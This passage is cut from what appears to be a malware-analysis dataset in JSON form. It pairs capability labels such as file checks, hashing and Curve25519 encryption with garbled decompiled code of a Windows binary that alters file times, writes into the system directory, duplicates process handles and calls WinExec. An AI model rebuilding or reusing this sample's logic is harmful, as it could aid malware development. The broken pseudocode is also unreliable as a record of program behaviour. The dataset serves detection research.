1;\n        pcVar7 = pcVar6 + 1;\n        cVar1 = *pcVar6;\n        pcVar6 = pcVar7;\n    } while (cVar1 != '\\0');\n    uVar3 = ~uVar3;\n    iVar2 = -1;\n    puVar5 = &var_128h;\n    do {\n        puVar8 = puVar5;\n        if (iVar2 == 0) break;\n        iVar2 = iVar2 + -1;\n        puVar8 = puVar5 + 1;\n        cVar1 = *puVar5;\n        puVar5 = puVar8;\n    } while (cVar1 != '\\0');\n    puVar5 = pcVar7 + -uVar3;\n    puVar8 = puVar8 + -1;\n    for (uVar4 = uVar3 >> 2; uVar4 != 0; uVar4 = uVar4 - 1) {\n        *puVar8 = *puVar5;\n        puVar5 = puVar5 + 1;\n        puVar8 = puVar8 + 1;\n    }\n    for (uVar3 = uVar3 & 3; uVar3 != 0; uVar3 = uVar3 - 1) {\n        *puVar8 = *puVar5;\n        puVar5 = puVar5 + 1;\n        puVar8 = puVar8 + 1;\n    }\n    (*_sym.imp.KERNEL32.dll_GetFileAttributesExA)(&var_128h, 0, &var_24h);\n    iVar2 = arg_ch;\n    if ((arg_ch == -1) && (iVar2 = fcn.00402da0(arg_8h),  iVar2 == -1)) {\n        return 0;\n    }\n    (*_sym.imp.KERNEL32.dll_SetFileTime)(iVar2, &lpCreationTime, &lpLastAccessTime, &lpLastWriteTime);\n    if (arg_ch == -1) {\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar2);\n    }\n    return 1;\n}\n",
        "token_count": 1139
    },
    "00404200": {
        "rules": [
            "hash data using murmur3/51beaa2d5a2f415db2ae4fc8ef819b72/938ec34b87fc49598ca2362852471498"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00404200(uint32_t arg_8h, uint16_t *arg_ch, int32_t arg_10h)\n\n{\n    ushort in_DX;\n    uchar *unaff_ESI;\n    uint32_t uVar1;\n    bool in_ZF;\n    \n    uVar1 = arg_8h;\n    if ((!in_ZF) && (in_ZF)) {\n        out(*unaff_ESI, in_DX);\n    }\n    if (arg_10h != 0) {\n        arg_8h = arg_10h;\n        do {\n            uVar1 = uVar1 + *arg_ch;\n            if (uVar1 >> 0x10 != 0) {\n                uVar1 = (uVar1 >> 0x10) + (uVar1 & 0xffff);\n            }\n            arg_ch = arg_ch + 1;\n            arg_8h = arg_8h + -1;\n        } while (arg_8h != 0);\n    }\n    return (uVar1 >> 0x10) + uVar1;\n}\n",
        "token_count": 239
    },
    "00401bd0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00401d27) overlaps instruction at (ram,0x00401d26)\n// \n// WARNING: Removing unreachable block (ram,0x00401d27)\n\nuint32_t fcn.00401bd0(void)\n\n{\n    uchar uVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t extraout_ECX;\n    uint *unaff_EDI;\n    uint *puVar4;\n    bool bVar5;\n    bool bVar6;\n    bool bVar7;\n    unkbyte6 Var8;\n    uchar uStack132;\n    uint uStack131;\n    uchar uStack100;\n    uint uStack99;\n    uchar uStack68;\n    uint auStack67 [7];\n    uchar uStack36;\n    uint uStack35;\n    \n    puVar4 = unaff_EDI;\n    iVar2 = fcn.004015b0();\n    if (iVar2 == 0) {\n        return 0;\n    }\n    fcn.00403a70();\n    iVar2 = fcn.00402cb0(0x407074);\n    bVar5 = iVar2 != -1;\n    bVar7 = SBORROW4(iVar2, -1);\n    bVar6 = iVar2 == -1;\n    if (!bVar6) {\n        return 0;\n    }\n    Var8 = fcn.004023c0();\n    uVar3 = Var8;\n    *0x41e8bc = 1;\n    if ((bVar7) || (!bVar7)) {\n        iVar2 = fcn.00404e10();\n        if (iVar2 != 0) goto code_r0x00401c67;\n        uStack36 = 0;\n        uStack132 = 0;\n        puVar4 = &uStack35;\n        for (iVar2 = 7; iVar2 != 0; iVar2 = iVar2 + -1) {\n            *puVar4 = 0;\n            puVar4 = puVar4 + 1;\n        }\n        *puVar4 = 0;\n        *(puVar4 + 2) = 0;\n        uStack100 = 0;\n        puVar4 = &uStack131;\n        for (iVar2 = 7; iVar2 != 0; iVar2 = iVar2 + -1) {\n            *puVar4 = 0;\n            puVar4 = puVar4 + 1;\n        }\n        *puVar4 = 0;\n        *(puVar4 + 2) = 0;\n        uStack68 = 0;\n        puVar4 = &uStack99;\n        for (iVar2 = 7; iVar2 != 0; iVar2 = iVar2 + -1) {\n            *puVar4 = 0;\n            puVar4 = puVar4 + 1;\n        }\n        *puVar4 = 0;\n        *(puVar4 + 2) = 0;\n        iVar2 = 7;\n        uVar3 = 0;\n        puVar4 = auStack67;\n    }\n    else {\n        puVar4 = unaff_EDI + 1;\n        uVar1 = in(Var8 >> 0x20);\n        *unaff_EDI = uVar1;\n        iVar2 = extraout_ECX;\n        if (bVar5 || bVar6) {\ncode_r0x00401c67:\n            *(puVar4 + 0x5e) = *(puVar4 + 0x5e);\n            return 0x3199e8;\n        }\n    }\n    for (; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar4 = uVar3;\n        puVar4 = puVar4 + 1;\n    }\n    *puVar4 = uVar3;\n    *(puVar4 + 2) = uVar3;\n    iVar2 = fcn.00404e60(&uStack132, &uStack100, &uStack36, &uStack68);\n    if (iVar2 == 0) {\n        return 0;\n    }\n    if ((-1 < iVar2) && (-1 >= iVar2)) {\n        out(0xc4, iVar2);\n        *(puVar4 + 3) = iVar2;\n    }\n    iVar2 = fcn.004016b0(&uStack36);\n    if (iVar2 == 0) {\n        return 0;\n    }\n    iVar2 = fcn.004032b0(&uStack132, &uStack100, &uStack36, &uStack68);\n    return iVar2 != 0;\n}\n",
        "token_count": 1012
    },
    "004032b0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x00403482) overlaps instruction at (ram,0x00403481)\n// \n// WARNING: Removing unreachable block (ram,0x004032fb)\n// WARNING: Removing unreachable block (ram,0x00403305)\n// WARNING: Type propagation algorithm not settling\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nint32_t __cdecl fcn.004032b0(int32_t arg_8h, int32_t *arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    char **ppcVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t extraout_ECX;\n    int32_t extraout_ECX_00;\n    uchar uVar4;\n    uint *puVar5;\n    bool bVar6;\n    bool bVar7;\n    uint var_213h;\n    uchar s;\n    uint var_10fh;\n    int32_t var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puVar5 = &var_213h;\n    for (iVar3 = 0x40; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar5 = 0;\n        puVar5 = puVar5 + 1;\n    }\n    *puVar5 = 0;\n    *(puVar5 + 2) = 0;\n    s = 0;\n    puVar5 = &var_10fh;\n    for (iVar3 = 0x40; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar5 = 0;\n        puVar5 = puVar5 + 1;\n    }\n    *puVar5 = 0;\n    var_ch = 1;\n    *(puVar5 + 2) = 0;\n    (*_sym.imp.KERNEL32.dll_GetSystemDirectoryA)();\n    (*_sym.imp.MSVCRT.dll_sprintf)(&s, 0x407030, 0xe8);\n    fcn.004030a0(0xf8);\n    iVar3 = fcn.00401000(arg_8h, arg_ch, arg_10h, arg_14h, var_4h);\n    if (iVar3 == 0) {\n        return 0;\n    }\n    ppcVar1 = fcn.004040f0(&s, var_4h, var_8h);\n    if (ppcVar1 == NULL) {\n        return 0;\n    }\n    if ((0 < ppcVar1) && (ppcVar1 < 1)) {\n        *ppcVar1 = *ppcVar1 + ppcVar1;\n        *ppcVar1 = *ppcVar1 + ppcVar1;\n    }\n    fcn.00401250();\n    iVar3 = fcn.00402cb0(0x407068);\n    if (iVar3 == -1) {\n        iVar3 = fcn.00402cb0(0x40705c);\n        bVar6 = iVar3 != -1;\n        bVar7 = iVar3 == -1;\n        iVar3 = extraout_ECX;\n        if (bVar7) goto code_r0x00403493;\n        uVar4 = 0xf;\n    }\n    else {\n        uVar4 = 0xe;\n    }\n    iVar3 = fcn.00403dd0(arg_8h);\n    if (iVar3 != 0) {\n        fcn.004029d0();\n        fcn.00403e10(uVar4);\n        return 1;\n    }\n    bVar6 = false;\n    bVar7 = *0x41e8b8 == 0;\n    iVar3 = extraout_ECX_00;\n    if (bVar7) {\n        return 0;\n    }\ncode_r0x00403493:\n    if ((!bVar6) && (bVar6)) {\n        if (iVar3 != 1 && bVar7) {\n            *(arg_ch + 0x5e) = *(arg_ch + 0x5e);\n            return -0x7affbe18;\n        }\n        *arg_ch = arg_8h + 4;\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    }\n    iVar3 = fcn.00401b30(arg_8h, &s);\n    if (iVar3 == 0) {\n        var_ch = iVar3;\n    }\n    iVar3 = var_ch;\n    if ((var_ch != 0) && (iVar2 = fcn.00403c20(arg_8h),  iVar2 == 0)) {\n        var_ch = 0;\n        iVar3 = iVar2;\n    }\n    if (iVar3 == 0) {\n        iVar3 = fcn.004012f0(arg_8h, 0);\n        var_ch = iVar3;\n    }\n    if (iVar3 != 0) {\n        fcn.00403e10();\n    }\n    (*_sym.imp.KERNEL32.dll_Sleep)();\n    (*_sym.imp.KERNEL32.dll_WinExec)(0x40707c, 0);\n    return iVar3;\n}\n",
        "token_count": 1153
    },
    "00403840": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x004039ad) overlaps instruction at (ram,0x004039ac)\n// \n// WARNING: Removing unreachable block (ram,0x0040399d)\n// WARNING: Removing unreachable block (ram,0x0040395e)\n\nuint __cdecl\nfcn.00403840(uint arg_8h, uint8_t *arg_ch, uint arg_10h, uint arg_14h, uint8_t *arg_18h, uint8_t *arg_1ch, \n            uint8_t *arg_20h)\n\n{\n    char cVar1;\n    uint8_t uVar2;\n    int32_t iVar3;\n    uint uVar4;\n    uint8_t *unaff_EBX;\n    uint8_t *puVar5;\n    uint8_t *unaff_ESI;\n    uint8_t *puVar6;\n    uint *puVar7;\n    bool bVar8;\n    uint8_t in_AF;\n    uint8_t in_TF;\n    uint8_t in_IF;\n    uint8_t in_NT;\n    uint8_t in_AC;\n    uint8_t in_VIF;\n    uint8_t in_VIP;\n    uint8_t in_ID;\n    uchar var_10ch;\n    uint var_10bh;\n    uint var_8h;\n    uint var_4h;\n    \n    bVar8 = false;\n    uVar2 = fcn.00403130(arg_18h, arg_1ch, arg_8h, 0x20);\n    if ((!bVar8) && (bVar8)) {\n        cVar1 = uVar2 - *arg_1ch;\n        arg_20h = arg_20h + -1;\n        arg_ch = func_0x10189805((in_NT & 1) * 0x4000 | SBORROW1(uVar2, *arg_1ch) * 0x800 | (in_IF & 1) * 0x200 |\n                                 (in_TF & 1) * 0x100 | (cVar1 < '\\0') * 0x80 | (cVar1 == '\\0') * 0x40 |\n                                 (in_AF & 1) * 0x10 | ((POPCOUNT(cVar1) & 1U) == 0) * 4 | uVar2 < *arg_1ch |\n                                 (in_ID & 1) * 0x200000 | (in_VIP & 1) * 0x100000 | (in_VIF & 1) * 0x80000 |\n                                 (in_AC & 1) * 0x40000);\n        unaff_ESI = arg_18h + 0x568d0c45;\n        arg_1ch = arg_1ch + 1;\n        unaff_EBX = arg_ch;\n    }\n    fcn.00403130(arg_18h, arg_1ch, arg_ch, 0x20);\n    fcn.00403130(arg_18h, arg_1ch, arg_10h, 0x20);\n    fcn.00403130(arg_18h, arg_1ch, arg_14h, 0x20);\n    iVar3 = fcn.004037f0();\n    if (iVar3 == -1) {\n        iVar3 = (*_sym.imp.MSVCRT.dll_rand)();\n        arg_20h[0x120] = iVar3 % 5;\n    }\n    else {\n        arg_20h[0x120] = iVar3;\n    }\n    var_10ch = 0;\n    puVar7 = &var_10bh;\n    for (iVar3 = 0x40; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    *puVar7 = 0;\n    var_4h = 0x104;\n    *(puVar7 + 2) = 0;\n    iVar3 = fcn.00403e20(0x80000001, 0x407258, 0x407284, &var_8h, &var_10ch, &var_4h);\n    puVar5 = unaff_EBX;\n    puVar6 = unaff_ESI;\n    if (iVar3 != 0) {\n    // WARNING: Could not recover jumptable at 0x004039b2. Too many branches\n    // WARNING: Treating indirect jump as call\n        iVar3 = (*_sym.imp.MSVCRT.dll__stricmp)(&var_10ch, 0x4072d4);\n        puVar5 = unaff_EBX;\n        puVar6 = unaff_ESI;\n        if ((iVar3 == 0) && ((iVar3 < 0 || (puVar5 = arg_18h,  puVar6 = arg_20h,  iVar3 >= 0)))) {\n            arg_20h[0x120] = arg_20h[0x120] | 0x80;\n            puVar5 = unaff_EBX;\n            puVar6 = unaff_ESI;\n        }\n    }\n    *puVar5 = *puVar5 & 0xc3;\n    puVar6[-0x74a4a1a1] = puVar6[-0x74a4a1a1] + puVar6;\n    uVar4 = in(0x5d);\n    return uVar4;\n}\n",
        "token_count": 1218
    },
    "00403b40": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nbool fcn.00403b40(void)\n\n{\n    int32_t iVar1;\n    uint var_10ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_4h = 0x104;\n    iVar1 = fcn.00403e20(0x80000002, 0x4072f0, 0x407330, &var_8h, &var_10ch, &var_4h);\n    if (iVar1 == 0) {\n        return false;\n    }\n    iVar1 = (*_sym.imp.MSVCRT.dll__access)(&var_10ch, 0);\n    return iVar1 != -1;\n}\n",
        "token_count": 152
    },
    "00403bd0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1",
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00403c0c) overlaps instruction at (ram,0x00403c0a)\n// \n// WARNING: Type propagation algorithm not settling\n\nchar ** __cdecl fcn.00403bd0(uint arg_8h)\n\n{\n    int32_t *piVar1;\n    uint8_t uVar2;\n    uint8_t *in_EAX;\n    char **ppcVar3;\n    int32_t in_ECX;\n    int32_t extraout_ECX;\n    char *pcVar5;\n    uint *unaff_ESI;\n    uint *unaff_EDI;\n    bool bVar6;\n    uint8_t in_AF;\n    bool in_OF;\n    ulong uVar7;\n    uint var_3dh;\n    char cVar4;\n    \n    if ((in_OF) || (!in_OF)) {\n        uVar7 = (*_sym.imp.MSVCRT.dll__access)(arg_8h, 0);\n        in_ECX = extraout_ECX;\n    }\n    else {\n        *unaff_EDI = *unaff_ESI;\n        uVar2 = *in_EAX;\n        *in_EAX = *in_EAX + 0x8b;\n        uVar7 = CONCAT44(0x6a08458b, in_EAX + (0x74 < uVar2) + 0x4060e5);\n        unaff_ESI = unaff_ESI + 1;\n        unaff_EDI = unaff_EDI + 1;\n    }\n    pcVar5 = uVar7 >> 0x20;\n    ppcVar3 = uVar7;\n    bVar6 = (POPCOUNT(ppcVar3 + 1 & 0xff) & 1U) != 0;\n    if (ppcVar3 + 1 == NULL) {\n        return 0x1;\n    }\n    if ((bVar6) && (!bVar6)) {\n        out(*unaff_ESI, uVar7 >> 0x20);\n        do {\n            cVar4 = ppcVar3 >> 8;\n            in_AF = 9 < (ppcVar3 & 0xf) | in_AF;\n            ppcVar3 = CONCAT31(CONCAT21(ppcVar3 >> 0x10, cVar4 - in_AF), -in_AF);\n        } while (in_AF || cVar4 == *pcVar5);\n        piVar1 = unaff_EDI + pcVar5 * 2;\n        *piVar1 = (*piVar1 + 0x7b) - in_AF;\n        *(in_ECX + 0x33) = ppcVar3;\n        *ppcVar3 = *ppcVar3 + ppcVar3;\n        *ppcVar3 = *ppcVar3 + -in_AF;\n        return ppcVar3;\n    }\n    return NULL;\n}\n",
        "token_count": 629
    },
    "00404050": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00404050(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t iVar3;\n    \n    iVar1 = fcn.00402cb0(0x40707c);\n    if (iVar1 == -1) {\n        return 0;\n    }\n    iVar1 = (*_sym.imp.KERNEL32.dll_OpenProcess)(0x40, 0, iVar1);\n    if (iVar1 == 0) {\n        return 0;\n    }\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetCurrentProcess)(arg_8h, iVar1, 0, 0, 0, 2);\n    iVar3 = (*_sym.imp.KERNEL32.dll_DuplicateHandle)(uVar2);\n    if (iVar3 == 0) {\n        return 0;\n    }\n    (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar1);\n    return 1;\n}\n",
        "token_count": 210
    },
    "004040f0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x004041e3) overlaps instruction at (ram,0x004041df)\n// \n// WARNING: Unable to track spacebase fully for stack\n\nuint __cdecl fcn.004040f0(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint *arg_ch_00;\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint *unaff_EDI;\n    uint var_4h;\n    \n    *0x41e8b8 = fcn.00403b40();\n    iVar2 = (*_sym.imp.KERNEL32.dll_CreateFileA)();\n    if (iVar2 == -1) {\n        return 0;\n    }\n    iVar3 = (*_sym.imp.KERNEL32.dll_WriteFile)();\n    if (iVar3 != 0) {\n        if (*0x41e8b8 != 0) {\n            iVar2 = fcn.00404050(iVar2);\n            *0x41e8b8 = iVar2 == 0;\n        }\n        arg_ch_00 = *((&stack0xfffffffc & 0xffff0000 | *0x10 - 4) + 8);\n        uVar4 = fcn.00403c70(0, arg_ch_00);\n        if (((&stack0xffffffb4 < 0xfffffff8 && *0x10 != 0x44) && (&stack0xffffffb4 >= 0xfffffff8 || *0x10 == 0x44)) ||\n           (uVar4 = *0x41e8b8,  *0x41e8b8 == 0)) {\n            *unaff_EDI = *arg_ch_00;\n            pcVar1 = _sym.imp.KERNEL32.dll_CloseHandle;\n            *0xa1e181d7 = 0;\n            *(uVar4 - 4) = 0x4041f3;\n            (*pcVar1)();\n        }\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 456
    },
    "00404e10": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint fcn.00404e10(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.00402da0(0x407010);\n    if (iVar1 != -1) {\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar1);\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 75
    },
    "00401d90": {
        "rules": [
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x00402322) overlaps instruction at (ram,0x0040231f)\n// \n// WARNING: Removing unreachable block (ram,0x00401df3)\n// WARNING: Removing unreachable block (ram,0x00402322)\n\nvoid __fastcall fcn.00401d90(uint param_1, int32_t param_2)\n\n{\n    int32_t *piVar1;\n    char **ppcVar2;\n    uint8_t *puVar3;\n    int32_t iVar4;\n    unkbyte6 Var5;\n    uint16_t uVar6;\n    uint32_t uVar7;\n    int32_t iVar8;\n    uint32_t *puVar9;\n    uint8_t uVar10;\n    char extraout_CH;\n    char extraout_CH_00;\n    uint8_t extraout_CH_01;\n    int32_t extraout_ECX;\n    uint extraout_ECX_00;\n    uint8_t extraout_DL;\n    char extraout_DH;\n    ushort extraout_DX;\n    uint16_t extraout_DX_00;\n    uint16_t extraout_DX_01;\n    uint8_t uVar14;\n    unkbyte6 *pVar11;\n    unkbyte6 *pVar12;\n    int32_t extraout_EDX;\n    int32_t extraout_EDX_00;\n    uint32_t uVar13;\n    char *unaff_EBX;\n    uint32_t unaff_EBP;\n    uint *unaff_ESI;\n    uint *puVar15;\n    uint *unaff_EDI;\n    uchar *puVar16;\n    uint16_t uVar17;\n    ushort in_SS;\n    bool in_CF;\n    uchar uVar18;\n    uchar uVar19;\n    uint8_t in_AF;\n    bool in_ZF;\n    bool bVar20;\n    bool bVar21;\n    char cVar22;\n    char cVar23;\n    ulong uVar24;\n    uint8_t in_stack_00000018;\n    uint in_stack_ffffffc8;\n    uint in_stack_ffffffcc;\n    uint uVar25;\n    uint uVar26;\n    uint *puVar27;\n    uint *arg_ch;\n    uint uVar28;\n    uint in_stack_ffffffe8;\n    uint uVar29;\n    char *pcVar30;\n    uint in_stack_ffffffec;\n    uint uVar31;\n    uint in_stack_fffffff0;\n    uint *puVar32;\n    \n    uVar10 = param_1 >> 8;\n    if (in_CF || in_ZF) {\ncode_r0x00401dad:\n        in_stack_fffffff0 = 10;\n        in_stack_ffffffec = 0x407024;\n        in_stack_ffffffe8 = 8;\n    }\n    else {\n        if (!in_CF && !in_ZF) goto code_r0x00401dad;\n        *unaff_EDI = *unaff_ESI;\n        unaff_EBX = unaff_EBX & 0xffff0000 | CONCAT11(0xdf, unaff_EBX);\n        unaff_EBP = 0x6ae181d0;\n        uVar10 = uVar10 | in_stack_00000018;\n        unaff_ESI = unaff_ESI + 1;\n        unaff_EDI = unaff_EDI + 1;\n    }\n    *(param_2 + 8) = *(param_2 + 8) + uVar10;\n    fcn.00402de0(0x41e874, in_stack_ffffffe8, in_stack_ffffffec, in_stack_fffffff0);\n    bVar20 = extraout_DH == '6';\n    fcn.00402de0(0x41e874, 8, 0x407030, 0x12);\n    puVar15 = unaff_ESI;\n    if ((!bVar20) && (bVar20)) {\n        puVar15 = unaff_ESI + 1;\n        out(*unaff_ESI, extraout_DX);\n    }\n    fcn.00402de0(0x41e874, 8, 0x407044, 4);\n    fcn.00402de0(0x41e874, 8, 0x407048, 0xc);\n    fcn.00402de0(0x41e874, 8, 0x407054, 7);\n    uVar26 = 0x41e874;\n    uVar25 = 0x401e86;\n    fcn.00402de0(0x41e874, 8, 0x40705c, 0xb);\n    fcn.00402de0(0x41e874, 8, 0x407068, 0xc);\n    fcn.00402de0(0x41e874, 8, 0x407074, 8);\n    fcn.00402de0(0x41e874, 8, 0x40707c, 0xd);\n    fcn.00402de0(0x41e874, 8, 0x40708c, 0x18);\n    cVar23 = '\\0';\n    cVar22 = (unaff_EBX + 1U ^ 0x50) < '\\0';\n    uVar31 = 0x4070a4;\n    uVar29 = 8;\n    uVar28 = 0x41e874;\n    uVar24 = fcn.00402de0(0x41e874, 8, 0x4070a4, 0x25);\n    pVar11 = uVar24 >> 0x20;\n    pVar12 = pVar11;\n    if (((cVar23 == cVar22) && (cVar23 != cVar22)) && (pVar12 = uVar24,  SBORROW4(pVar11, -0x3397f596))) {\n        pVar12 = *pVar11;\n    }\n    *(pVar12 + 8) = *(pVar12 + 8) + extraout_CH;\n    fcn.00402de0(0x41e874, uVar28, uVar29, uVar31);\n    fcn.00402de0(0x41e874, 8, 0x4070d8, 0xc);\n    uVar17 = unaff_EBX & 0xff00 | (unaff_EBX & 0xffff) - 0x12;\n    cVar23 = SBORROW2(uVar17, extraout_DX_00);\n    cVar22 = uVar17 - extraout_DX_00 < 0;\n    bVar20 = uVar17 == extraout_DX_00;\n    uVar28 = 0x401fee;\n    fcn.00402de0(0x41e874, 8, 0x4070e4, 0xd);\n    if ((bVar20 || cVar23 != cVar22) || (!bVar20 && cVar23 == cVar22)) {\n        uVar28 = 6;\n    }\n    uVar31 = 0x4070f4;\n    uVar29 = 8;\n    fcn.00402de0(0x41e874, 8, 0x4070f4, uVar28);\n    fcn.00402de0(0x41e874, 8, 0x4070fc, 5);\n    bVar20 = extraout_DL < 0x51;\n    bVar21 = extraout_DL == 0x51;\n    puVar32 = 0x41e874;\n    uVar28 = 0x402064;\n    uVar24 = fcn.00402de0(0x41e874, 8, 0x407104, 0xd);\n    if ((bVar20 || bVar21) || (!bVar20 && !bVar21)) {\n        uVar28 = 0x19;\n        uVar31 = 0x407114;\n        uVar29 = 8;\n        cVar22 = extraout_CH_00;\ncode_r0x0040207a:\n        pcVar30 = (uVar24 >> 0x20) + 8;\n        *pcVar30 = *pcVar30 + cVar22;\n        fcn.00402de0(0x41e874, uVar29, uVar31, uVar28);\n        puVar32 = unaff_EDI + 1;\n        puVar15 = puVar15 + -1;\n        uVar26 = 0x402099;\n        func_0x10188011();\n        unaff_EBP = extraout_EDX + 0xf;\n        uVar25 = 0x407130;\n        in_stack_ffffffcc = 8;\n        in_stack_ffffffc8 = 0x41e874;\n        fcn.00402de0(0x41e874, 8, 0x407130, uVar26);\n    }\n    else {\n        cVar22 = extraout_CH_00 - *unaff_EBX;\n        puVar9 = unaff_EDI + 0x6a;\n        puVar16 = *puVar9;\n        *puVar9 = *puVar9 - &stack0xfffffff0;\n        piVar1 = uVar24 + 0x14;\n        iVar8 = *piVar1;\n        iVar4 = *piVar1;\n        *piVar1 = (iVar4 - unaff_EBP) - (puVar16 < &stack0xfffffff0);\n        if (SBORROW4(iVar8, unaff_EBP) != SBORROW4(iVar4 - unaff_EBP, puVar16 < &stack0xfffffff0))\n        goto code_r0x0040207a;\n    }\n    fcn.00402de0(0x41e874, 8, 0x407140, 0xe);\n    fcn.00402de0(0x41e874, 8, 0x407150, 0xb);\n    fcn.00402de0(0x41e874, 8, 0x40715c, 0xb);\n    fcn.00402de0(0x41e874, 8, 0x407168, 0xb);\n    uVar10 = (unaff_EBX & 0xffff) >> 8;\n    uVar18 = 0xcf < uVar10;\n    cVar22 = uVar10 + 0x30;\n    bVar20 = cVar22 == '\\0';\n    uVar19 = (POPCOUNT(cVar22) & 1U) == 0;\n    pcVar30 = 0x41e874;\n    uVar7 = fcn.00402de0(0x41e874, 8, 0x407174, 10);\n    if ((bVar20) || (!bVar20)) {\ncode_r0x004021b3:\n        uVar7 = 0x407180;\n        arg_ch = 0x8;\n        puVar27 = 0x41e874;\n        fcn.00402de0(0x41e874, 8, 0x407180, 0xc);\n        if ((uVar19) || (!uVar19)) {\ncode_r0x004021ea:\n            uVar26 = 0xe;\n            uVar25 = 0x40718c;\n            in_stack_ffffffcc = 8;\n            in_stack_ffffffc8 = 0x41e874;\n            goto code_r0x004021f8;\n        }\n        piVar1 = segment(in_SS, *0x10 + -0x28);\n        if (!uVar18) {\n            if (uVar19) {\n                *(*piVar1 + 0x74) = *(*piVar1 + 0x74) | extraout_CH_01;\n                cVar22 = func_0x652821ba();\n                unaff_EBX[-0x8acef3c] = unaff_EBX[-0x8acef3c] + cVar22;\n                return;\n            }\n            goto code_r0x004021ea;\n        }\n    }\n    else {\n        unaff_EBX = unaff_EBX + 1;\n        if (!uVar18 && unaff_EBX != NULL) {\n            in_AF = 9 < (uVar7 & 0xf) | in_AF;\n            ppcVar2 = (uVar7 & 0xffff0000 | CONCAT11((uVar7 >> 8) + in_AF, uVar7 + in_AF * '\\x06') & 0xff0f) + 0x2a;\n            uVar18 = *ppcVar2 < unaff_EBX;\n            *ppcVar2 = *ppcVar2 + -unaff_EBX;\n            puVar15 = puVar15 + 1;\n            uVar19 = (POPCOUNT(puVar15 & 0xff) & 1U) == 0;\n            goto code_r0x004021b3;\n        }\ncode_r0x004021f8:\n        fcn.00402de0(in_stack_ffffffc8, in_stack_ffffffcc, uVar25, uVar26);\n        puVar27 = puVar32;\n        arg_ch = puVar15;\n        uVar7 = unaff_EBP;\n        pcVar30 = unaff_EBX;\n    }\n    uVar13 = uVar7;\n    iVar8 = fcn.00402de0(0x41e874, 8, 0x40719c, 0x11);\n    bVar20 = iVar8 + -0x6e32 < 0;\n    uVar26 = 0x402257;\n    fcn.00402de0(0x41e874, 8, 0x4071b0, 0x13);\n    if ((bVar20) || (!bVar20)) {\n        uVar26 = 0x14;\n        uVar13 = 0x4071c4;\n        arg_ch = 0x8;\n    }\n    Var5 = *(extraout_ECX + 0x40);\n    uVar17 = Var5 >> 0x20;\n    puVar3 = extraout_EDX_00 + 8;\n    uVar10 = extraout_ECX >> 8;\n    cVar22 = CARRY1(*puVar3, uVar10);\n    bVar20 = SCARRY1(*puVar3, uVar10);\n    *puVar3 = *puVar3 + uVar10;\n    uVar24 = fcn.00402de0(0x41e874, arg_ch, uVar13, uVar26);\n    uVar13 = uVar24 >> 0x20;\n    iVar8 = uVar24;\n    if ((bVar20) || (!bVar20)) {\n        uVar26 = 0x33;\n        uVar25 = 0x4071d8;\n        in_stack_ffffffcc = 8;\n    }\n    else {\n        puVar15 = puVar27 + 1;\n        *puVar27 = *Var5;\n        uVar13 = 0xd868336a;\n        puVar27 = puVar15;\n        uVar26 = extraout_ECX_00;\n        if (!SCARRY4(iVar8, 1)) {\n            *0xd86833a4 = *0xd86833a4 + 'j' + cVar22;\n            puVar3 = iVar8 + -0x357fb11d;\n            *puVar3 = *puVar3 << 1 | *puVar3 < '\\0';\n            *pcVar30 = *pcVar30 << 1;\n            puVar3 = iVar8 + -0x8fdc309;\n            *puVar3 = *puVar3 << 1 | *puVar3 < '\\0';\n            goto code_r0x004022e6;\n        }\n    }\n    *(uVar13 + 8) = *(uVar13 + 8) + (extraout_ECX_00 >> 8);\n    fcn.00402de0(0x41e874, in_stack_ffffffcc, uVar25, uVar26);\n    uVar6 = fcn.00402de0(0x41e874, 8, 0x40720c, 